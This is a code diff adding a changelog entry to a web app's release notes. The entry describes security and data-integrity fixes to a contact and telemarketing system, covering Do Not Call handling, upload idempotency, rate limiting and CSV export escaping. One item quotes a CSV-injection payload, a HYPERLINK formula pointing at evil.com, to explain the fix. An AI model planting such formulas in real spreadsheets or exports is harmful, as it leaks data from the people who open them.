@@ -3,6 +3,23 @@
 
 const ENTRIES = [
   {
+    date: 'April 18, 2026 (Pass 4)',
+    title: 'Deeper audit: SMS compliance hole, NIS idempotency, CSV injection, rate limiting',
+    items: [
+      // ── Compliance & Data Integrity ──
+      { tag: 'fix', text: 'SMS "Do Not Call" label was silently ignored — a TCPA compliance hole. The normalizer used exact-match string equality, so "Do Not Call" never mapped to a disposition, AND even if it had, there was no handler branch for it. Result: SMS-labeled DNCs stayed callable in future campaigns. Now recognizes "do not call" / "dnc" and processes it with a proper handler (marks phone filtered, sets contact marketing_result to "Do Not Call", syncs DNC status to the global phones table so the dashboard count is accurate).' },
+      { tag: 'fix', text: 'SMS "Spanish Speaker" label was silently ignored too. Added normalizer match and handler branch that mirrors cold-call treatment — phone filtered, contact flagged with Spanish Speaker marketing_result.' },
+      { tag: 'fix', text: 'SMS normalizer was brittle. "Not Interested." (trailing period) or "Wrong  Number" (double space) fell through to no_action because the matcher did lowercase+trim only. Normalizer now strips trailing punctuation (.!?;:) and collapses runs of whitespace before matching.' },
+      { tag: 'fix', text: 'NIS upload not idempotent — re-uploading the same file doubled every phone\'s times_reported count, which could falsely cross the 3-strike threshold and kill legitimate Correct phones. New nis_events table tracks (phone, day) tuples with ON CONFLICT DO NOTHING. Only truly-new events increment times_reported. Re-uploads of a previously processed file are now a no-op, with a log line showing the duplicate count.' },
+      { tag: 'fix', text: 'Duplicate finder used different address normalization than the rest of the system. "123 Main St." and "123 Main St" were treated as separate records by the dedup page but as the same record by the marketing filter and owner occupancy logic — you had ghost duplicates no cleanup path would catch. Now uses street_normalized (same generated column used elsewhere) with a defensive COALESCE fallback.' },
+
+      // ── Security ──
+      { tag: 'fix', text: 'CSV injection vulnerability in exports. Cells starting with =, +, -, @, \\t, or \\r can execute as Excel formulas on open — a =HYPERLINK("http://evil.com/...") in any imported data could leak info when your team opens the export. Records export and /download/* endpoints now prefix such cells with a single quote (OWASP standard guidance).' },
+      { tag: 'fix', text: 'Login endpoint had no rate limiting — unlimited POSTs per IP made brute-force trivial. Added in-memory rate limiter: 5 failed attempts per 15 minutes per IP, with 429 response + Retry-After header on exceed. Successful login clears the counter.' },
+      { tag: 'fix', text: 'File upload validation missing server-side. Client checked .endsWith(".csv") but multer accepted any file up to 50MB — xlsx uploads silently produced empty results, binary payloads were a mild DOS vector. Added fileFilter to both multer configs (server.js, property-import-routes.js) that rejects anything not CSV/TXT by extension or MIME type, with a clear error message.' },
+    ],
+  },
+  {
     date: 'April 18, 2026',
     title: 'Production audit: filter correctness, data integrity, performance & concurrency',
     items: [
